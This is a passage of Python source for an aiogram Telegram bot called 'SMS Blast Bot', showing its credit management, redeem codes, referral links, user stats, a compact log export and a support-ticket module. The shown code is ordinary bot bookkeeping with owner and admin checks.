                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Adjusted</b>\n\n"
                f"Redeem code <code>{code}</code> se mile <b>{deducted}</b> credits wapas le liye gaye hain.\n"
                f"{em(EMOJI_MONEY, '💳')} New Balance: <b>{new_val}</b>",
                parse_mode="HTML"
            )
            notified += 1
        except:
            pass
        await asyncio.sleep(0.05)

    await safe_edit(cq.message, 
        f"{em(EMOJI_CHECK, '✅')} <b>Credits Removed!</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Code: <code>{code}</code>\n"
        f"{em(EMOJI_STAR, '👥')} Users Affected: <b>{len(affected)}</b>\n"
        f"{em(EMOJI_BELL, '📨')} Notified: <b>{notified}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:redeem:menu")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:add")
async def owner_credits_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_credits_uid)
    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💰')} <b>Add Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_uid)
async def owner_credits_add_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(credit_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.add_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits add karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.add_credits_amount)
async def owner_credits_add_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("credit_uid")

    def _add(d):
        add_credits(uid, amount, d, is_manual=True)
        return get_user_credits(uid, d)

    new_balance = atomic_update(_add)
    await state.clear()

    try:
        await msg.bot.send_message(
            uid,
            f"{em(EMOJI_MONEY, '💰')} <b>Credits Added!</b>\n\n+{amount} credits mile hain!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{new_balance}</b>",
            parse_mode="HTML"
        )
    except: pass

    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> added to <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{new_balance}</b>",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:credits:deduct")
async def owner_credits_deduct_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.deduct_credits_uid)
    await safe_edit(cq.message, 
        f"{em(EMOJI_MONEY, '💰')} <b>Deduct Credits</b>\n\n{sc('step 1/2')}: User ka Telegram ID bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_uid)
async def owner_credits_deduct_uid(msg: Message, state: FSMContext):
    if not is_owner(msg.from_user.id, load()):
        await state.clear()
        return
    try:
        uid = int(msg.text.strip())
        await state.update_data(deduct_uid=uid)
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid ID bhejo.", parse_mode="HTML")
        return
    await state.set_state(S.deduct_credits_amount)
    await msg.answer(
        f"{em(EMOJI_MONEY, '💰')} <b>{sc('step 2/2')}</b>\n\nKitne credits deduct karne hain?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.deduct_credits_amount)
async def owner_credits_deduct_amount(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        amount = int(msg.text.strip())
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo.", parse_mode="HTML")
        return

    fsmd = await state.get_data()
    uid = fsmd.get("deduct_uid")
    success = deduct_credits(uid, amount, d)
    save(d)
    await state.clear()

    if success:
        try:
            await msg.bot.send_message(
                uid,
                f"{em(EMOJI_WARNING, '⚠️')} <b>Credits Deducted!</b>\n\n-{amount} credits kat gaye.\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
                parse_mode="HTML"
            )
        except: pass
        await msg.answer(
            f"{em(EMOJI_CHECK, '✅')} <b>{amount} credits</b> deducted from <code>{uid}</code>!\n{em(EMOJI_MONEY, '💳')} New Balance: <b>{get_user_credits(uid, d)}</b>",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )
    else:
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Insufficient credits! User ke paas sirf <b>{get_user_credits(uid, d)}</b> credits hain.",
            reply_markup=kb([(f"{sc('back')}", "owner:home")]),
            parse_mode="HTML"
        )

@R.callback_query(F.data == "owner:settings")
async def owner_settings(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    settings = d.get("settings", {})

    text = (
        f"{em(EMOJI_GEAR, '⚙️')} <b>Bot Settings</b>\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Referral Credits: <b>{settings.get('ref_credits', 3)}</b>\n"
        f"{em(EMOJI_CROWN, '👑')} Max Owners: <b>{settings.get('max_owners', 6)}</b>\n\n"
        f"<i>Settings change karne ke liye niche se select karein.</i>"
    )
    rows = [
        [btn("sᴇᴛ ʀᴇғᴇʀʀᴀʟ ᴄʀᴇᴅɪᴛs", "owner:settings:ref", EMOJI_GIFT, "🎁")],
        [btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")]
    ]
    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "owner:settings:ref")
async def owner_settings_ref(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_ref_credits)
    await safe_edit(cq.message, 
        f"{em(EMOJI_GIFT, '🎁')} <b>Set Referral Credits</b>\n\nReferral pe kitne credits dena hai?\n<i>Example: 5</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.message(S.set_ref_credits)
async def owner_settings_ref_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    try:
        credits = int(msg.text.strip())
        if credits < 0: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid positive number bhejo.", parse_mode="HTML")
        return

    d.setdefault("settings", {})["ref_credits"] = credits
    d["premium"]["ref_credits"] = credits
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Referral Credits Updated!</b>\n\nAb har referral pe <b>{credits}</b> credits milenge.",
        reply_markup=kb([(f"{sc('back')}", "owner:settings")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:activity")
async def owner_activity_log(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    log_entries = d.get("activity_log", [])[-20:]
    if not log_entries:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Activity Log</b>\n\n<i>Koi activity nahi hai abhi tak.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Recent Activity Log</b>\n"]
        for entry in reversed(log_entries):
            ts = fmt_time(entry.get("timestamp", 0))
            action = entry.get("action", "unknown")
            uid = entry.get("uid", 0)
            details = entry.get("details", "")
            lines.append(f"[{ts}] <code>{uid}</code> — <b>{action}</b> — {details}")
        text = "\n".join(lines)

    await safe_edit(cq.message, 
        text,
        reply_markup=kb([
            (f"{sc('refresh')}", "owner:activity"),
            (f"{sc('back')}", "owner:home")
        ]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:sms_history")
async def owner_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return

    all_history = d.get("sms_history", {})
    total_entries = sum(len(v) for v in all_history.values())

    text = f"{em(EMOJI_STAR, '📋')} <b>Global SMS History</b>\n\nTotal Records: <b>{total_entries}</b>\n\n"
    text += "<i>Per-user history unke Stats mein available hai.</i>"

    await safe_edit(cq.message, 
        text,
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:home", "user:cancel"}))
async def user_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    uid = cq.from_user.id

    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await safe_edit(cq.message, force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        return

    if is_owner(uid, d):
        await safe_edit(cq.message, owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
        return
    if is_admin(uid, d):
        await safe_edit(cq.message, admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await safe_edit(cq.message, f"{em(EMOJI_CROSS, '⛔')} Access nahi hai!", parse_mode="HTML")
        return
    await safe_edit(cq.message, user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "user:credits")
async def user_credits(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    credits = get_user_credits(uid, d)
    await cq.answer(f"💰 Credits: {credits}\nOwner: {SUPER_ADMIN_NAME}", show_alert=True)

def do_redeem_code(uid: int, code: str):
    """
    Atomically validate + consume a redeem code.
    Returns (status, credits) where status in:
      'ok', 'invalid', 'expired', 'used'
    """
    code = code.strip().upper()

    def _redeem(d):
        codes = d.get("redeem_codes", {})
        if code not in codes:
            return ("invalid", 0)
        code_data = codes[code]
        if code_data.get("uses_left", 0) <= 0:
            return ("expired", 0)
        if uid in code_data.get("used_by", []):
            return ("used", 0)

        credits = code_data["credits"]
        add_credits(uid, credits, d, is_manual=False)
        code_data["uses_left"] = code_data.get("uses_left", 1) - 1
        code_data.setdefault("used_by", []).append(uid)
        return ("ok", credits)

    return atomic_update(_redeem)

@R.callback_query(F.data == "user:redeem")
async def user_redeem_start(cq: CallbackQuery, state: FSMContext):
    await state.set_state(S.redeem_code)
    await safe_edit(cq.message, 
        f"{em(EMOJI_GIFT, '🎁')} <b>Redeem Code</b>\n\nApna redeem code enter karein:\n<i>Example: GIFTABC123</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.redeem_code)
async def user_redeem_done(msg: Message, state: FSMContext):
    uid = msg.from_user.id
    code = msg.text.strip()
    await state.clear()

    status, credits = do_redeem_code(uid, code)

    if status == "invalid":
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid redeem code!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    if status == "expired":
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Ye code expire ho gaya hai!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    if status == "used":
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Aap pehle se ye code use kar chuke hain!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return

    d = load()
    await msg.answer(
        f"{em(EMOJI_GIFT, '🎉')} <b>Redeem Successful!</b>\n\n{em(EMOJI_MONEY, '💰')} +{credits} credits added!\n{em(EMOJI_MONEY, '💳')} Balance: <b>{get_user_credits(uid, d)}</b>",
        reply_markup=kb([(f"{sc('home')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:refer")
async def user_refer(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    code = generate_user_refer_code(uid, d)
    save(d)
    ref_credits = d.get("settings", {}).get("ref_credits", 3)

    me = await cq.bot.get_me()
    await safe_edit(cq.message, 
        f"{em(EMOJI_STAR, '👥')} <b>Referral Program</b>\n\n"
        f"Apna referral code share karein aur har successful referral pe <b>{ref_credits}</b> credits paayein!\n\n"
        f"{em(EMOJI_GIFT, '🎁')} Your Code: <code>{code}</code>\n\n"
        f"{em(EMOJI_GEAR, '🔗')} Share Link:\n"
        f"https://t.me/{me.username}?start={code}",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:stats")
async def user_stats(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    udata = d["users"].get(str(uid), {})
    stats = d.get("stats", {})

    await safe_edit(cq.message, 
        f"{em(EMOJI_STAR, '📊')} <b>Your Stats</b>\n\n"
        f"{em(EMOJI_MONEY, '💰')} Credits: <b>{udata.get('credits', 0)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} SMS Sent: <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_GEAR, '📅')} Joined: <b>{fmt_time(udata.get('joined_at', 0))}</b>\n\n"
        f"{em(EMOJI_STAR, '📈')} Bot Total Sent: <b>{stats.get('total_sent', 0)}</b>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "user:sms_history")
async def user_sms_history(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    history = d.get("sms_history", {}).get(str(uid), [])[-10:]

    if not history:
        text = f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b>\n\n<i>Abhi tak koi SMS send nahi kiya.</i>"
    else:
        lines = [f"{em(EMOJI_GEAR, '📜')} <b>Your SMS History</b> (Last 10)\n"]
        for i, entry in enumerate(reversed(history), 1):
            ts = fmt_time(entry.get("timestamp", 0))
            num = entry.get("number", "Unknown")
            msg_preview = entry.get("message", "")[:30]
            status = entry.get("status", "unknown")
            status_icon = em(EMOJI_CHECK, "✅") if status == "sent" else em(EMOJI_CROSS, "🛑") if status == "stopped" else em(EMOJI_WARNING, "⏳")
            lines.append(f"{i}. [{ts}] {status_icon} <code>{mask_number(num)}</code> — {msg_preview}...")
        text = "\n".join(lines)

    await safe_edit(cq.message, text, reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")

@R.callback_query(F.data == "user:pricing")
async def user_pricing(cq: CallbackQuery, state: FSMContext):
    d = load()
    plans = d.get("pricing", {}).get("plans", [])

    if not plans:
        await cq.answer("❌ Abhi koi plan available nahi!", show_alert=True)
        return

    text = f"{em(EMOJI_MONEY, '💰')} <b>Buy Credits</b>\n\n"
    for plan in plans:
        text += f"{em(EMOJI_STAR, '📋')} <b>{plan['name']}</b>\n"
        text += f"   {em(EMOJI_MONEY, '💰')} Price: <b>{plan['price']} {plan.get('currency', 'INR')}</b>\n"
        text += f"   {em(EMOJI_GIFT, '🎁')} Credits: <b>{plan['credits']}</b>\n\n"

    rows = []
    for plan in plans:
        rows.append([btn_url(f"Buy {sc(plan['name'][:20])}", plan['payment_link'], EMOJI_MONEY, "💳")])
    rows.append([btn("ʙᴀᴄᴋ", "user:home", EMOJI_GEAR, "🔙")])

    await safe_edit(cq.message, text, reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")

@R.callback_query(F.data == "user:info")
async def user_info(cq: CallbackQuery, state: FSMContext):
    await safe_edit(cq.message, 
        f"{em(EMOJI_GEAR, 'ℹ️')} <b>SMS Blast Bot {_VERSION}</b>\n\n"
        f"{em(EMOJI_GEAR, '🤖')} Bot for sending bulk SMS via Firebase-connected Android devices.\n\n"
        f"{em(EMOJI_CROWN, '👤')} Developer: <a href='{SUPER_ADMIN_LINK}'>{SUPER_ADMIN_NAME}</a>\n"
        f"{em(EMOJI_BELL, '💬')} Support: Contact owner ({SUPER_ADMIN_NAME}) for any issues.\n\n"
        f"<i>Bot use karne ke liye credits chahiye. Referral se free credits paayein!</i>",
        reply_markup=kb([(f"{sc('back')}", "user:home")]),
        parse_mode="HTML",
        disable_web_page_preview=True
    )

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()


@R.message(Command("logs"))
async def cmd_logs(msg: Message, state: FSMContext):
    """
    Compact export — only:
      1. Users who are currently members of the required Force-Join channels
      2. Users who received manually-added credits (via /addcredit or owner:credits:add)
    Kept small and quick to generate/read (no full DB dump).
    """
    await state.clear()
    uid = msg.from_user.id
    d = load()
    if not is_owner(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Owner only!", parse_mode="HTML")
        return

    wait = await msg.answer(f"{em(EMOJI_GEAR, '⏳')} Generating compact log...", parse_mode="HTML")

    log_lines = []
    log_lines.append("=" * 60)
    log_lines.append("  SMS BLAST BOT - COMPACT LOG EXPORT")
    log_lines.append(f"  Exported by: {uid} | Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    log_lines.append("=" * 60)
    log_lines.append("")

    users = d.get("users", {})

    # ── Section 1: Force-Join channel members ──────────────────
    fj = d.get("force_join", {})
    channels = fj.get("channels", [])
    log_lines.append("[FORCE JOIN CHANNELS]")
    log_lines.append(f"Enabled: {fj.get('enabled', False)} | Channels: {len(channels)}")
    for ch in channels:
        log_lines.append(f"  - {ch.get('title', 'Channel')} (ID: {ch.get('id')})")
    log_lines.append("")

    fj_member_lines = []
    if fj.get("enabled") and channels:
        checked = 0
        for uid_str in users:
            try:
                target_uid = int(uid_str)
            except ValueError:
                continue
            is_member_of_all = True
            joined_channels = []
            for ch in channels:
                if not ch.get("required", True):
                    continue
                ok = await check_membership(msg.bot, target_uid, ch["id"])
                if ok:
                    joined_channels.append(ch.get("title", "Channel"))
                else:
                    is_member_of_all = False
            if joined_channels:
                udata = users[uid_str]
                fj_member_lines.append(
                    f"  UID: {uid_str} | Name: {udata.get('name', 'Unknown')} | "
                    f"Joined: {', '.join(joined_channels)}{' (ALL)' if is_member_of_all else ' (PARTIAL)'}"
                )
            checked += 1
            if checked % 20 == 0:
                await asyncio.sleep(0.5)   # throttle to stay under Telegram's rate limits

    log_lines.append(f"[FORCE JOIN MEMBERS] Total: {len(fj_member_lines)}")
    log_lines.extend(fj_member_lines if fj_member_lines else ["  (none)"])
    log_lines.append("")

    # ── Section 2: Manually credited users ──────────────────────
    manual_lines = []
    for uid_str, udata in users.items():
        manual_amt = udata.get("manual_added_credits", 0)
        if manual_amt and manual_amt > 0:
            manual_lines.append(
                f"  UID: {uid_str} | Name: {udata.get('name', 'Unknown')} | "
                f"Manual Credits: {manual_amt} | Current Balance: {udata.get('credits', 0)}"
            )

    log_lines.append(f"[MANUALLY CREDITED USERS] Total: {len(manual_lines)}")
    log_lines.extend(manual_lines if manual_lines else ["  (none)"])
    log_lines.append("")

    log_lines.append("=" * 60)
    log_lines.append("  END OF COMPACT LOG")
    log_lines.append("=" * 60)

    log_text = "\n".join(log_lines)

    from aiogram.types import BufferedInputFile
    file_bytes = io.BytesIO(log_text.encode("utf-8"))
    file_bytes.name = f"compact_logs_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

    try:
        await wait.delete()
    except Exception:
        pass

    await msg.answer_document(
        document=BufferedInputFile(file_bytes.getvalue(), filename=file_bytes.name),
        caption=(
              f"{em(EMOJI_GEAR, '📜')} <b>Compact Log Export</b>\n"
              f"{em(EMOJI_CHECK, '✅')} Force-Join Members: <b>{len(fj_member_lines)}</b>\n"
              f"{em(EMOJI_MONEY, '💰')} Manually Credited: <b>{len(manual_lines)}</b>\n"
              f"{em(EMOJI_GEAR, '📅')} Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        ),
        parse_mode="HTML"
    )


# ==================== V5.0 ADDITIVE MANAGEMENT MODULE ====================
def _v5_ticket_find(d: dict, ticket_id: str):
    for ticket in d.get("support_tickets", []):
        if str(ticket.get("id")) == str(ticket_id):
            return ticket
    return None


def _v5_safe(value) -> str:
    import html
    return html.escape(str(value or ""))


@R.callback_query(F.data == "v5:lookup")
async def v5_lookup_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Manager access required.", show_alert=True)
        return
    await state.set_state(S.v5_user_lookup)
    await safe_edit(
        cq.message,
        "🔎 <b>V5 User Lookup</b>\n\nSend the registered user's Telegram ID.\n<i>This searches only accounts stored in this bot.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home" if is_owner(cq.from_user.id, d) else "admin:home")]),
        parse_mode="HTML"
    )
    await cq.answer()


@R.message(S.v5_user_lookup)
async def v5_lookup_result(msg: Message, state: FSMContext):
    d = load()
    manager_id = msg.from_user.id
    if not is_admin(manager_id, d):
        await state.clear()
        return
    raw = (msg.text or "").strip()
    if not raw.isdigit():
        await msg.answer("❌ Please send a numeric Telegram ID.")
        return
    target = int(raw)
    d.setdefault("v5_searches", []).append({"timestamp": int(time.time()), "manager_id": manager_id, "target_id": target})
    d["v5_searches"] = d["v5_searches"][-5000:]
    save(d)
    user = d.get("users", {}).get(str(target))
    if not user:
        await msg.answer("🔍 No registered user found with that Telegram ID.")
        return
    referrals = sum(1 for u in d.get("users", {}).values() if str(u.get("referred_by", "")) == str(target))
    status = "BANNED" if target in d.get("banned", []) else ("APPROVED" if target in d.get("approved", []) or is_admin(target, d) or d.get("free_mode") else "PENDING / NO ACCESS")
    joined = fmt_time(int(user.get("joined_at", 0) or 0)) if user.get("joined_at") else "Unknown"
    text = (
        "🔎 <b>V5 User Profile</b>\n\n"
        f"👤 Name: <b>{_v5_safe(user.get('name', 'Unknown'))}</b>\n"
        f"🆔 Telegram ID: <code>{target}</code>\n"
        f"📌 Status: <b>{status}</b>\n"
        f"💰 Credits: <b>{int(user.get('credits', 0) or 0)}</b>\n"
        f"📊 Recorded uses: <b>{int(user.get('uses', 0) or 0)}</b>\n"
        f"🤝 Referrals: <b>{referrals}</b>\n"
        f"📅 Joined: <b>{joined}</b>\n"
        f"🎁 Manual credits added: <b>{int(user.get('manual_added_credits', 0) or 0)}</b>"
    )
    history = [x for x in d.get("activity_log", []) if str(x.get("uid")) == str(target)]
    sms_records = d.get("sms_history", {}).get(str(target), [])
    search_records = [x for x in d.get("v5_searches", []) if str(x.get("target_id")) == str(target)]
    timeline = []
    for entry in history[-10:]:
        timeline.append(f"• {fmt_time(int(entry.get('timestamp',0)))} — {_v5_safe(entry.get('action'))}: {_v5_safe(entry.get('details'))[:100]}")
    for entry in sms_records[-10:]:
        timeline.append(f"• {fmt_time(int(entry.get('timestamp',0)))} — usage record: {_v5_safe(entry.get('status','recorded'))}")
    if timeline:
        text += "\n\n<b>Recent records</b>\n" + "\n".join(timeline[-12:])
    text += "\n\n<i>Full retained history is attached as a private report. Older/deleted records cannot be reconstructed.</i>"
    back = "owner:home" if is_owner(manager_id, d) else "admin:home"
    report = {
        "user": {"telegram_id": target, "profile": user, "status": status, "referral_count": referrals},
        "activity_records": history,
        "usage_records": sms_records,
        "lookup_audit_records": search_records,
        "exported_at": datetime.now().isoformat(timespec="seconds")
    }
    report_name = f"user_record_{target}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    await state.clear()
    await msg.answer(text, reply_markup=kb([(f"{sc('search again')}", "v5:lookup"), (f"{sc('manager panel')}", back)]), parse_mode="HTML")
    await msg.answer_document(BufferedInputFile(json.dumps(report, ensure_ascii=False, indent=2).encode("utf-8"), filename=report_name), caption=f"Complete retained bot records for Telegram ID {target}")


@R.callback_query(F.data == "v5:analytics")
async def v5_analytics(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Manager access required.", show_alert=True)
        return
    users = d.get("users", {})
    now = int(time.time())
    recent = sum(1 for u in users.values() if now - int(u.get("joined_at", 0) or 0) <= 7 * 86400)
    credits = sum(max(0, int(u.get("credits", 0) or 0)) for u in users.values())
    referrals = sum(1 for u in users.values() if u.get("referred_by"))
    banned = len(d.get("banned", []))
    approved = len(d.get("approved", []))
    active_sessions = sum(1 for session in USER_SESSIONS.values() if session.task and not session.task.done())
    pending = max(0, len(users) - len(set(d.get("approved", []))) - len(set(d.get("admins", []))) - len(set(d.get("owners", []))) - banned) if not d.get("free_mode") else 0
    text = (
        "📈 <b>V5 Management Analytics</b>\n\n"
        f"👥 Registered users: <b>{len(users)}</b>\n"
        f"🆕 Joined in last 7 days: <b>{recent}</b>\n"
        f"✅ Approved users: <b>{approved}</b>\n"
        f"⏳ Approx. awaiting access: <b>{pending}</b>\n"
        f"🚫 Banned accounts: <b>{banned}</b>\n"
        f"💰 Credits held by users: <b>{credits}</b>\n"
        f"🤝 Users with a referrer: <b>{referrals}</b>\n"
        f"🧑‍💻 Active bot sessions: <b>{active_sessions}</b>\n\n"
        "<i>Counts are calculated from the bot's existing JSON database.</i>"
    )
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await safe_edit(cq.message, text, reply_markup=kb([(f"{sc('refresh')}", "v5:analytics"), (f"{sc('back')}", back)]), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v5:support")
async def v5_support_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if str(uid) not in d.get("users", {}):
        await cq.answer("Please register with /start first.", show_alert=True)
        return
    await state.set_state(S.v5_support_message)
    await safe_edit(cq.message, "🎫 <b>Create Support Ticket</b>\n\nDescribe your issue in one message. Do not include passwords, OTPs or payment secrets.", reply_markup=kb([(f"{sc('cancel')}", "user:home")]), parse_mode="HTML")
    await cq.answer()


@R.message(S.v5_support_message)
async def v5_support_create(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if str(uid) not in d.get("users", {}):
        await state.clear()
        return
    body = (msg.text or "").strip()
    if not body or len(body) > 1500:
        await msg.answer("Please send a text description (1–1500 characters).")
        return
    ticket_id = f"T{int(time.time())}-{uid}"
    ticket = {"id": ticket_id, "uid": uid, "name": str(msg.from_user.full_name or "User")[:80], "message": body, "created_at": int(time.time()), "status": "open", "replies": []}
    d.setdefault("support_tickets", []).append(ticket)
    save(d)
    await state.clear()
    await msg.answer(f"✅ Support ticket created.\nTicket ID: <code>{ticket_id}</code>\nA manager will review it.", parse_mode="HTML")
    # Notify configured managers; this is a single ticket notification, not a broadcast.
    recipients = set(d.get("owners", [])) | set(d.get("admins", []))
    for manager_id in recipients:
        try:
            await msg.bot.send_message(manager_id, f"🎫 <b>New support ticket</b>\nID: <code>{ticket_id}</code>\nUser: <code>{uid}</code>\n\n{_v5_safe(body[:1200])}", parse_mode="HTML")
        except Exception:
            pass


@R.callback_query(F.data == "v5:mytickets")
async def v5_my_tickets(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    own = [t for t in d.get("support_tickets", []) if int(t.get("uid", 0)) == uid][-8:]
    if not own:
        await cq.answer("You have no support tickets yet.", show_alert=True)
        return
    lines = ["📨 <b>Your Support Tickets</b>\n"]
    for t in reversed(own):
        lines.append(f"• <code>{_v5_safe(t.get('id'))}</code> — <b>{_v5_safe(t.get('status', 'open').upper())}</b>")
    await safe_edit(cq.message, "\n".join(lines), reply_markup=kb([(f"{sc('back')}", "user:home")]), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data == "v5:tickets")
async def v5_ticket_inbox(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Manager access required.", show_alert=True)
        return
    tickets = d.get("support_tickets", [])
    open_tickets = [t for t in tickets if t.get("status") in {"open", "responded"}]
    rows = []
    for ticket in reversed(open_tickets[-15:]):
        rows.append([btn(f"{ticket.get('id')} · {str(ticket.get('status', 'open')).upper()}", f"v5:ticket:{ticket.get('id')}", EMOJI_BELL, "🎫")])
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    rows.append([btn("ʙᴀᴄᴋ", back, EMOJI_GEAR, "🔙")])
    await safe_edit(cq.message, f"🎫 <b>Support Inbox</b>\n\nOpen/responded: <b>{len(open_tickets)}</b>\nTotal tickets: <b>{len(tickets)}</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
    await cq.answer()


@R.callback_query(F.data.startswith("v5:ticket:"))
async def v5_ticket_detail(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Manager access required.", show_alert=True)
        return
    ticket_id = cq.data.split(":", 2)[2]
    ticket = _v5_ticket_find(d, ticket_id)
    if not ticket:
        await cq.answer("Ticket not found.", show_alert=True)
        return
    replies = ticket.get("replies", [])[-5:]
    reply_text = "\n".join(f"\n↳ {_v5_safe(r.get('by'))}: {_v5_safe(r.get('text'))}" for r in replies)
    text = (f"🎫 <b>Ticket { _v5_safe(ticket_id) }</b>\n\nUser: <code>{ticket.get('uid')}</code>\n"
            f"Name: {_v5_safe(ticket.get('name'))}\nStatus: <b>{_v5_safe(ticket.get('status'))}</b>\n\n"
            f"{_v5_safe(ticket.get('message'))}{reply_text}")
